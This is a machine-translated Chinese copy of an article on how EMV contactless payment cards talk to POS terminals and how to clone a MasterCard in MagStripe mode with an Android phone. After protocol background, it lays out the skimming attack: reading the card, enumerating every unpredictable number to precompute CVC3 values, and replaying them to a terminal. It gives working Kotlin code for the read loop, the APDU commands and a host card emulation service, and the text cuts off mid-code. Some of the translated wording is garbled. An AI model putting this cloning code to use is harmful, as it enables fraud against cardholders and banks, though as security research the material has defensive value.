<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🗼 📹 🎱 使用移动应用程序克隆非接触式卡 📞 👙 ⛹🏽</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="看到“引擎盖”下的银行卡上发生了什么总是很有趣的。 银行卡和POS终端的通信协议如何实现，如何工作以及多么安全。 当我在Digital Security实习时，这样的机会出现在我面前。 结果，当在MagStripe模式下解析EMV卡的一个已知漏洞时，决定实现一种移动应用程序，该应用程序能够使用其自身...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>使用移动应用程序克隆非接触式卡</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/421543/"> 看到“引擎盖”下的银行卡上发生了什么总是很有趣的。 银行卡和POS终端的通信协议如何实现，如何工作以及多么安全。 当我在Digital Security实习时，这样的机会出现在我面前。 结果，当在MagStripe模式下解析EMV卡的一个已知漏洞时，决定实现一种移动应用程序，该应用程序能够使用其自身的命令以及对请求和响应的详细分析，通过非接触式界面与终端进行通信。 并且尝试实现在MagStripe模式下克隆MasterCard卡的方法。 <br><br> 在本文中，我将尝试描述什么是EMV卡，其工作方式以及如何使用Android克隆您的MasterCard卡。 <br><br>  <i><b>“有些东西是钱买不到的。</b></i>  <i><b>万事达卡»</b></i> <br><br><h3> 什么是EMV卡？ </h3><br>  EMV是带有芯片的银行卡的国际标准。  <b>E</b> uropay + <b>M</b> asterCard + <b>V</b> ISA参与了该标准的制定，因此得名。 让我们尝试找出卡如何通过非接触式接口与POS终端进行通信。 <br><a name="habracut"></a><br> 让我们从基础开始。 <br><br> 物理EMV非接触式卡的工作原理几乎与RFID标签相同。 如果是基本的，则芯片会进入电磁场，并在一个封闭的导电电路（在我们的示例中是位于周围的天线）中，并置于交变磁场中，产生交流电。 该电流为并联连接到卡谐振电路的特殊电容器充电。 存储在电容器中的能量用于执行微电路卡的各种操作。 当读取器更改电磁场时，更改将立即在芯片上引起注意。 使用信号调制，我们可以以二进制形式传输信息。 如果您在卡上连接了负载电阻或更改了电容器的电容，则可以更改卡电路中的电流强度，这将导致其在读取器电路区域内产生的电磁场发生变化，因此卡将传输数据。 读者将不得不检测这些变化。 这种物理交互受ISO / IEC 14443标准<i>“识别卡-非接触式集成电路卡-邻近卡”的</i>约束。 <br><br> 卡芯片本身是运行JavaCard的智能卡，JavaCard是Java的单独版本，适用于计算资源较少且支持密码算法的平台。  JavaCard下载小应用程序，它们是应用程序。 还有JavaCard的特定标准GlobalPlatform，它可以安全地管理地图上的数据，并允许您加载，修改和删除地图上的应用程序。 在本文中，我们将不考虑智能卡本身的安全机制。 足以知道受保护的数据（例如卡的私钥和秘密主密钥）在安全的地方，并且不可能使用标准方法将其删除。 <br><br> 我还提醒您一些不熟悉的人的术语。 <br><br>  <b>POS终端</b> （销售点）-卖方的设备，可读取卡并开始付款。 此外，我们将这个设备简称为终端。 <br>  <b>发卡银行</b>是<b>发卡的银行</b> 。 <br>  <b>收单行</b> -向卖方发行POS终端并处理其付款的银行。 <br>  <b>付款系统</b>是收单行和发卡行之间的中央链接，绝对所有付款都通过收款行，并且它知道哪家银行应该将钱转入多少。 世界上有许多付款系统，除了著名的<b>Visa</b>和<b>MasterCard，</b>还有<b>美国运通</b> ， <b>中国银联</b>和俄罗斯付款系统<b>MIR</b> 。 <br><br> 好了，卡和读卡器可以通信。 它们以<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Tag-Length-Value</a>的形式互相发送APDU命令，即 标签的名称以十六进制，其长度和值本身进行传输。 当然，所有命令都在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">文档中</a>进行了描述，如下所示： <br><br><img src="https://habrastorage.org/webt/kn/ne/tj/knnetjhcx4h0rd7xijgzyv5goye.png" alt="图片"><br><br> 标准EMV交易分几个阶段进行，我将描述接触界面情况下的完整交互算法，对于非接触界面，该算法有所缩短： <br><br><ul><li> 应用选择； </li><li> 初始化应用程序处理； </li><li> 读取应用程序数据 </li><li> 离线认证 </li><li> 处理限制； </li><li> 持卡人支票； </li><li> 码头一侧的风险管理； </li><li> 分析最终行动； </li><li> 卡侧的风险管理； </li><li> 分析卡的动作； </li><li> 在线处理； </li><li> 操作完成。 </li></ul><br><img src="https://habrastorage.org/webt/0y/sc/rd/0yscrdsiso65ccn0arqjwxc4joe.png" alt="图片"><br><br> 我们简要考虑每个操作。 <br><br> 应用选择。 通常，一张卡上可能有多个应用程序。 例如，一张银行卡和一张旅行票。 终端需要以某种方式找出在哪里使用哪种算法。 所谓的<b>应用程序标识符（AID</b> ）用于选择一个应用程序。 为了理解这一点，终端发送一个<b>SELECT</b>命令。 例如，Visa Classic卡的<b>AID</b>如下所示： <b>A0000000031010</b> 。 如果有几个这样的代码作为响应，并且终端可以使用多个应用程序，则终端将显示一个列表，并提供选择我们所需的应用程序的功能。 如果终端不支持任何应用程序代码，则该操作将被终端拒绝。 <br><br> 初始化应用程序处理。 在此，首先检查地理位置。 例如，Maestro Momentum卡只能在俄罗斯使用才能付款。 进行此阶段是为了使发行人有机会在进行离线操作时应用现有的在线风险管理方法。 在此阶段，如果发卡行在世界某个国家/地区禁止此类交易，则可以凭卡本身取消EMV交易。 此外，卡向终端发送一组特殊结构的信息，该信息包含对卡和应用程序的功能的描述。 <br><br> 读取应用程序数据。 交易所需的各种卡数据被传输到终端，例如卡号，有效期，交易计数器和许多其他数据。 其中一些将在后面讨论。 <br><br> 样本数据： <br><br><img src="https://habrastorage.org/webt/qq/af/8u/qqaf8ualsk94r5lgoqqz9gupznc.png" alt="图片"><br><br> 发卡行的公钥证书和卡本身也被发送。 为了使终端能够验证某些卡数据的数字签名，使用了<b>PKI基础结构</b> （公钥基础结构）。 简而言之，支付系统具有一对密钥，即公用密钥和私有密钥，并且该支付系统适用于<b>CA（中心机构）的</b>所有参与者。 实际上，用于发行者的每个银行的支付系统发行新的密钥对，并且同时生成发行者的银行的公共密钥的证书，并用私钥CA对其进行签名。 此外，当银行发行新卡时，它会相应地为该卡生成一对密钥，并且还会生成卡的公钥证书，并使用银行的私钥对其进行签名。 在终端中，通常为各种支付系统连接一个公钥证书。 因此，当卡发送发卡行的银行的公共密钥证书和卡的证书本身时，终端可以使用支付系统的公共密钥轻松地检查整个链。 终端使用支付系统的公钥，首先验证发行者银行证书的真实性，如果它是真实的，那么它可以被信任，现在使用发行者的银行证书，您可以验证卡本身的证书。  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">有关EMV安全性</a>的文章中<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">有</a>更多详细信息。 <br><br> 离线身份验证。 终端确定所支持的离线认证方式的类型。 有静态（ <b>静态数据身份验证-SDA</b> ），动态（ <b>动态数据身份验证-DDA</b> ）和组合（ <b>组合数据身份验证-CDA</b> ）。 这些方法也基于PKI。  <b>SDA</b>只是在发卡行的银行私钥<b>DDA</b>上签名的数据-终端发送一些随机数，并且卡必须使用其私钥对其进行签名，并且终端将使用之前收到的卡证书来验证此签名，因此终端将确保该卡确实具有私钥-因此是真实的。  <b>CDA</b>只是两者的组合。 <br><br> 处理限制。 在此，终端检查先前从卡接收的数据是否适合该操作。 例如，它检查应用<b>程序</b>应用<b>程序到期日期（标签“ 5F24”）</b>和<b>应用程序生效日期（标签“ 5F25”）</b>的开始/结束日期。 它还会检查应用程序的版本。 在此阶段执行的操作结果也记录在<b>TVR</b>报告中<b>（终端验证结果）</b> 。 根据此阶段的结果，即使应用程序已过期，也无法取消交易。 <br><br> 持卡人支票。 进行持卡人验证是为了验证提供卡的人并验证他是否是卡的真实所有者。  EMV标准提供了各种<b>持卡人验证方法</b> 。 验证方法在终端和地图上均已定义。 它们包含在所谓的<b>CVM列表中</b> 。 在执行过程中，终端和卡对接收到的CVM列表进行比较，并选择一般的验证方法。 <br><br> 支持的验证方法列表： <br><br><ul><li> 不需要CVM（'011111'b）; </li><li>  CVM处理失败（'000000'b）; </li><li> 签名（'011110'b）; </li><li> 在线验证了加密的PIN（'000010'b）; </li><li> 由ICC执行的明文PIN验证（“ 000001” b）； </li><li> 由ICC执行的纯文本PIN验证和签名（'000011'b）； </li><li> 由ICC（'000100'b）进行的加密PIN验证； </li><li> 由ICC执行的加密PIN验证和签名（'000101'b）。 </li></ul><br> 这里也有关于此主题的有趣信息。 <br><br> 终端侧的风险管理。 在此阶段，终端根据收单行的风险管理设置对交易参数进行内部验证。 终端可以在完成读取卡数据的过程到终端形成第一<b>GENERATE AC</b>命令之间的任何时间执行风险管理程序。 终端方面的风险管理包括三种机制： <br><br><ul><li> 控制在卡上执行的操作的大小（ <b>下限检查</b> ）； </li><li> 发行人在线授权交易的<b>随机交易选择</b> （ <b>Random Transaction Selection</b> ）； </li><li> 检查使用卡的离线活动（ <b>速度检查</b> ）。 </li></ul><br> 分析终端动作。 在此阶段，终端将分析交易先前步骤的结果。 终端根据分析结果来决定是在线进行操作，允许离线进行操作还是拒绝操作。 <br><br> 卡侧的风险管理。 该卡已经从<b>GENERATE AC</b>命令数据中接收到有关交易，终端和终端检查结果的数据，依次执行其自身的风险管理程序并就如何完成操作做出自己的决定。 <br><br> 分析卡的动作。 在这一阶段，卡完成了风险管理程序并生成了对终端的响应密码。 如果卡决定批准交易，则会生成<b>交易证书</b> 。 如果卡决定实时执行操作，则它将生成一个<b>ARQC（授权请求密码）</b> 。 如果卡使用其他授权方法，则使用“ <b>应用程序授权引用”</b> 。 如果卡拒绝交易，则使用<b>应用程序认证密码</b> 。 <br><br> 需要另一个<b>ARPC（授权响应密码）</b>密码对发行者进行身份验证。 发行者生成密码ARPC并将密码发送到卡，如果卡确认了密码，则发行者通过卡进行身份验证。 <br><br>  I. M. Goldovsky的书中关于密钥的安全性以及卡和发行者的相互认证的一些知识： <blockquote> 相互身份验证的含义是，卡和终端使用ARQC和ARPC密码进行身份验证。 密码是使用密钥（卡是已知的，发卡行是银行知道的），交易号，终端生成的随机数以及交易，终端和卡的某些详细信息生成的数据。 对于ARPC，发行者的授权响应代码也会添加到列出的数据中。 如果不知道卡的密钥来生成密码，就无法在当前时间内使用当前技术水平计算ARQC / ARPC值，因此成功验证的事实表明了卡和发行者的真实性。 在线身份验证是对卡进行身份验证的最可靠方法。 这是由于它是由发行方直接执行的，而无需以终端形式的中介。 此外，具有112位临时密钥的3DES算法用于在线身份验证，其加密强度与用于卡应用程序的脱机身份验证的非对称密钥模块长度超过1700位的RSA算法的密码强度相对应。 在卡上使用这种长度的非对称密钥仍然非常罕见。 通常使用模块长度为1024、1152或1408位的密钥。 </blockquote><br><br> 最终，在线交易要经过一个链条： <br>  <b>卡&lt;-&gt; POS终端&lt;-&gt;银行获取&lt;-&gt;付款系统&lt;-&gt;银行发行人。</b> <br><br><img src="https://habrastorage.org/webt/lg/od/lo/lgodlo0oz2jbpxbje3o15q9ikgs.jpeg" alt="图片"><br><br><h3> 在MagStripe模式下克隆万事达卡 </h3><br> 我们直接进行克隆的原则。 这种非接触式卡攻击方法是由奥地利大学的两位研究人员<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Michael Roland，Josef Langer</a>出版的。 它基于称为“ <i>略读”</i>的一般原则。 在这种情况下，攻击者通过从银行卡中读取（复制）信息来窃取银行卡中的钱。 在一般情况下，重要的是保持PIN机密而不泄漏。 但是，按照奥地利人的方法，我们不需要知道这一点。 对于EMV非接触式内核2应用程序的内核版本，成功克隆了支付卡，该协议的版本支持两种非接触式卡操作模式：EMV协议<b>（MasterCard PayPass M / Chip）</b>和<b>MagStripe（MasterCard PayPass MagStripe）</b>模式。 <br><br>  <b>MagStripe</b>是磁条卡支持模式。 此模式在具有非接触式接口的万事达卡上实现。 对于难以转移整个基础架构以支持芯片非接触式EMV交易的银行，最有可能需要MagStripe模式。 顺便说一下，Visa卡还具有类似的操作模式<b>-PayWave MSD（磁条数据）</b> 。 <br><br> 与芯片卡相比，非接触式卡的交易处理过程被截断了，并且通常以以下方式工作： <br><br><ol><li> 终端发送<b>SELECT PPSE</b> （接近支付系统环境）命令。 该卡发送受支持的应用程序列表。 </li><li> 终端发送一个<b>SELECT</b>命令。 作为回应，他收到了必要的申请详细信息。 </li><li> 终端发送<b>GET_PROCESSING_OPTIONS</b>命令。 该卡回答其支持的身份验证类型以及那里是否存在持卡人的验证。 </li><li> 终端发送<b>READ_RECORDS</b>命令。 作为响应，卡发送的Track1和Track2与卡磁条上记录的几乎相同。 </li><li> 终端发送<b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b>命令。 这意味着卡应根据传递的不可预测的编号生成CVC3值。 </li></ol><br><img src="https://habrastorage.org/webt/yx/4k/go/yx4kgocqjxhraaeqz1c4qr4ukpe.jpeg" alt="图片"><br><br><div class="spoiler">  <b class="spoiler_title">在现实生活中一切看起来如何？</b> <div class="spoiler_text"> 看起来像一个<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">APDU</a>小组。  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">所有标签列表</a> 。 <br><br>  APDU-应用协议数据单元是带有映射命令或映射响应的帧的符号。 <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">这里</a>和<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">这里</a>都有关于此主题的几篇文章。 <br></div></div><br> 该卡支持特殊的COMPUTE CRYPTOGRAPHIC CHECKSUM命令，该命令的参数是不可预测的数字数据对象（UDOL）中定义的数据。  <b>结果，使用3DES算法和密钥的卡计算出动态值CVC3（卡验证码）。</b> 作为3DES函数的参数，使用UDOL数据和事务计数器（应用程序事务计数器，ATC）的连接。  <b>因此，CVC3的值始终取决于UN和ATC对象。</b> <br><br> 换句话说，此命令是必需的，以便卡生成特定的“签名”，以便发行者可以验证卡。 但是，该签名本身缺少交易本身的签名。 签名包含<b>ATC</b>值<b>-2个字节</b> ， <b>CVC3（Track1）</b> <b>-2个字节</b> ， <b>CVC3（Track2）-2个</b> <b>字节</b> ，这些值是由卡根据秘密密钥生成的，发卡行和交易计数器（ATC）也知道这些秘密密钥。 同时，为了生成签名，POS终端通知<b>UN（不可预测号码）</b>卡-4字节，该字节也用于生成签名。 不可预测的数字可防止在真实卡上生成验证码，以供以后在欺诈性交易中使用。 对于攻击，联合国强烈干涉我们，因为在不超出事务计数器限制的情况下不可能枚举4个字节。 但是，此规范存在一些缺点。 <br><br> 首先，规范将联合国限制为数字编码，即<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">二进制十进制代码（BCD）</a> ，这实际上意味着，如果我们在HEX中查看这样的编码数字，则只会看到0到9之间的数字，所有其他值都将被考虑在内。仿佛被禁止。 因此，联合国的数额从4,294,967,295减少到99,999,999。 <br><br> 其次，有效的联合国数字位数由卡确定。 因此，根据磁道中的特殊参数，根据卡的类型，UN中的位数可以从10到10,000，实际上，通常会找到1000个值。 <br><br>  <b>因此，攻击计划如下：</b> <br><br><ol><li> 我们读了卡，并从终端机中找到联合国提供的有效位数 </li><li> 我们对所有UN进行排序，获取<b>COMPUTE_CRYPTOGRAHIC_CHECKSUM</b>函数的所有可能值，并将它们保存在具有映射UN-&gt;结果的对应表中 </li><li> 我们将其带到POS终端，找出POS终端要求的号码。 </li><li> 我们从表中选择所需的结果，并根据终端的要求进行替换。 </li><li> 交易即将结束。 </li><li> 利润。 但是，由于开证行可能会拒绝此类交易，因此无法保证交易批准成功。 </li></ol><br><img src="https://habrastorage.org/webt/5q/iw/uh/5qiwuhgbebcdx_0bdzdbrvwmcd0.jpeg" alt="图片"><br><br> 还值得注意的是，交易计数器（ATC）阻止了以前使用的身份验证代码的重用，这意味着如果我们使用了这种攻击方式，则必须再次复制卡，因为交易计数器已经用于获取信息并已在签名中使用，这意味着如果我们有一个1000的交易计数器，并且在将交易发送给银行之后，银行将不再接受计数器&lt;1001以下的交易。<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，交易计数器的大小限制为2个字节，这意味着我们最多只能执行65个卡克隆周期，此后该卡很可能会停止工作。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大多数情况下，从卡传输的数据对于所有交易都是静态的。当然，除了</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">COMPUTE_CRYPTOGRAPHIC_CHECKSUM</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。生成动态CVC3代码证申请应该由一个团队来读</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的SELECT</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，然后</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET_PROCESSING_OPTIONS</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，才把</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">COMPUTE_CRYPTOGRACHIC_CHECKSUM</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它是一个很重要的一点。这三个命令是生成CVC3所必需的。根据实验，仅使用这三个命令，</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在Google Galaxy Nexus S上对1000个值进行排序就只花了一分钟。</font></font></b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了使用终端和卡，使用了</font><font style="vertical-align: inherit;">MasterCard </font><font style="vertical-align: inherit;">的</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Terminal Simulator</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">它可以与各种NFC读卡器和智能卡读卡器配合使用。</font><font style="vertical-align: inherit;">此外，它是完全免费的。</font><font style="vertical-align: inherit;">它允许您使用POS终端的各种设置测试卡，并维护来自终端的所有请求和卡响应的详细日志。</font><font style="vertical-align: inherit;">它也可以在地图模式下用于测试手机上的应用程序。</font></font><br><br><img src="https://habrastorage.org/webt/if/cw/ka/ifcwkapz8euoz-fdb9hnmbedigq.png" alt="图片"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要读取卡，使用了NFC读取器</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACR122</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br><br><img src="https://habrastorage.org/webt/kx/75/q8/kx75q8xlkxsg3q3hodn9h1yze2o.jpeg" alt="图片"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，让我们尝试将所有这些转换为代码。</font><font style="vertical-align: inherit;">该应用程序将使用Android的Kotlin语言编写。</font><font style="vertical-align: inherit;">首先，让我们尝试描述团队的总体结构。</font></font><br><br><pre><code class="plaintext hljs">data class Command( var CLA: String = 0x00.toString(), var INS: String = 0x00.toString(), var P1: String = "", var P2: String = "", var Lc: String = "", var Nc: String = "", var Le: String = "", var Nr: String = "", var SW1WS2: String = "" ) { fun split(): ByteArray { return getHexString().hexToByteArray() } fun getHexString() = CLA.plus(INS).plus(P1).plus(P2).plus(Lc).plus(Nc).plus(Le).plus(Nr).plus(SW1WS2) }</code> </pre> <br> 首先，我们需要与NFC建立合作关系。 在电话上，我们可以在两种模式下工作。 在卡模式下，这是当我们响应来自终端的命令时，在终端模式下，是当我们发送命令并读取例如卡时。 即 首先，我们可以克隆卡，然后确保使用已经准备好的命令响应终端的请求。 <br><br> 以下是与NFC交互的简化实现： <br><br><pre> <code class="plaintext hljs"> private var nfcAdapter: NfcAdapter? = null /*!&lt; represents the local NFC adapter */ private var tag: Tag? = null /*!&lt; represents an NFC tag that has been discovered */ private lateinit var tagcomm: IsoDep /*!&lt; provides access to ISO-DEP (ISO 14443-4) */ private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name)) /*!&lt; NFC tech lists */ private var nfcintent: PendingIntent? = null .... override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) nfcAdapter = NfcAdapter.getDefaultAdapter(this) nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0) cardEmulation = CardEmulation.getInstance(nfcAdapter) nfcAdapter?.enableForegroundDispatch(this, nfcintent, null, nfctechfilter) } .... override fun onNewIntent(intent: Intent) { super.onNewIntent(intent) tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) cardReading(tag) } ..... override fun onResume() { super.onResume() if (canSetPreferredCardEmulationService()) { this.cardEmulation?.setPreferredService(this, ComponentName(this, "com.nooan.cardpaypasspass.NfcService")); } } override fun onPause() { if (canSetPreferredCardEmulationService()) { this.cardEmulation?.unsetPreferredService(this) } super.onPause() } private fun cardReading(tag: Tag?) { tagcomm = IsoDep.get(tag) try { tagcomm.connect() } catch (e: IOException) { error = "Reading card data ... Error tagcomm: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } try { when { commands != null -&gt; readCardWithOurCommands() mChip -&gt; readCardMChip() else -&gt; readCardMagStripe() } } catch (e: IOException) { error = "Reading card data ... Error tranceive: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } finally { tagcomm.close() } } protected fun execute(command: Command, log:Boolean): ByteArray { val bytes = command.split() listLogs.add(bytes.toHex()) val recv = tagcomm.transceive(bytes) listLogs.add(recv.toHex()) return recv }</code> </pre><br> 这描述了命令序列并枚举了从0到999的周期中的不可预测数字的值，我们将Nc更改为“ 00000 $ {String.format（“％03d”，i）}“。Replace（” ..（？！$ ）“。toRegex（），” $ 0“）。 并且不要忘记每次在COMPUTE_CRYPTOGRAPHIC_CHECKSUM之前执行GET_PROCESSING_OPTIONS，否则将不计算支票金额。 <br><br> 结果，所有这些都可以写入文件，并且在使用此终端时已经使用。 在这里，我们得到名称和卡号，我们可以在屏幕上显示它。 <br><br><pre> <code class="plaintext hljs"> private fun readCardMagStripe() { try { var response = execute(Commands.SELECT_PPSE) //       val select = Commands.SELECT_APPLICATION.apply { Nc = response.toHex().substring(52, 68) SW1WS2 = "00" } val cardtype: String = getTypeCard(select.split()) execute(select) execute(Commands.GET_PROCESSING_OPTIONS) response = execute(Commands.READ_RECORD_1.apply { P2 = "0C" Lc = "00" Le = "" Nc = "" }) if (cardtype === "MasterCard") { cardnumber = "Card number: ${response.getCards()}" cardexpiration = "Card expiration: ${response.getExpired()}" showData() for (i in 0..999) { execute(Commands.GET_PROCESSING_OPTIONS, false) execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply { Lc = "04" Nc = "00000${String.format("%03d", i)}".replace("..(?!$)".toRegex(), "$0 ") }) } } finishRead() }</code> </pre><br> 我们需要的一组命令。 <br><br><pre> <code class="plaintext hljs">object Commands { val SELECT_PPSE = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Lc = "0E", Nc = "32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00") val SELECT_APPLICATION = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Nc = "07") val GET_PROCESSING_OPTIONS = Command(CLA = "80", INS = "A8", P1 = "00", P2 = "00", Lc = "02", Nc = "83 00", Le = "00") val READ_RECORD_1 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "14", Lc = "00", Le = "00") val READ_RECORD_2 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "1C", Lc = "00", Le = "00") val READ_RECORD_3 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "24", Lc = "00", Le = "00") val READ_RECORD_4 = Command(CLA = "00", INS = "B2", P1 = "02", P2 = "24", Lc = "00", Le = "00") val COMPUTE_CRYPTOGRAPHIC_CHECKSUM = Command(CLA = "80", INS = "2A", P1 = "8E", P2 = "80", Le = "00") }</code> </pre><br> 要从终端实现窃听命令，您需要启动服务并在清单中声明它。 在此服务中，来自终端的命令进入processCommandApdu，我们将其与文件中存储的命令进行比较，并给出响应，该响应将写入下一行。 <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".NfcService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_NFC_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/apdu_config"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><pre> <code class="plaintext hljs">class NfcService : HostApduService() { fun getData(context: Context?): List&lt;Command&gt; { var list: List&lt;Command&gt; = arrayListOf() filePath?.let { if (it.isNotBlank()) { list = getCommands(Uri.fromFile(File(it)).readTextFromUri(context), this::showError) } else { Toast.makeText(applicationContext, "Not found file path", 